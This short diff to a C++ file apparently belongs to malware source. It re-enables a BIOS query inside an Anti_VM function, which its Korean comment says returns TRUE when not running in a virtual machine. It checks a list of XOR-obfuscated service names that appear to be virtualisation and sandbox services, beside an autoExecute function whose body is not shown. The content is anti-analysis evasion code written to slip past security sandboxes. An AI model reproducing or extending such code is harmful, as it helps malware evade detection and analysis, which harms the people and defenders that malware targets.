@@ -4,7 +4,7 @@
 #include <string>
 #include <list>
 #include "HashFunction_initialize.h"
-//#include "wmic.h"
+#include "wmic.h"
 
 void autoExecute() {
     CHAR szDir[260];
@@ -31,8 +31,8 @@ void autoExecute() {
 
 /* VM이 아닐경우 TRUE 반환 */
 bool Anti_VM() {
-    //WMIC wc;
-    //std::string bios_info = wc.getBIOSInfo();
+    WMIC wc;
+    std::string bios_info = wc.getBIOSInfo();
 
     HKEY hKey;
     std::list<std::string> services = { StringXOR("sufgpv", 5).c_str(), StringXOR("suf(v6", 5).c_str(), StringXOR("sufmpg", 5).c_str(), StringXOR("hvshhjpc", 5).c_str(), StringXOR("SGj}Hjpv`", 5).c_str(), StringXOR("SGj}Bp`vq", 5).c_str(),  StringXOR("SGj}Bp`vq", 5).c_str(), StringXOR("SGj}VC", 5).c_str(), StringXOR("}`k`sqfmk", 5).c_str(), StringXOR("}`kk`q", 5).c_str(), StringXOR("}`kk`q3", 5).c_str(), StringXOR("}`kvsf", 5).c_str(), StringXOR("}`ksag", 5).c_str()};
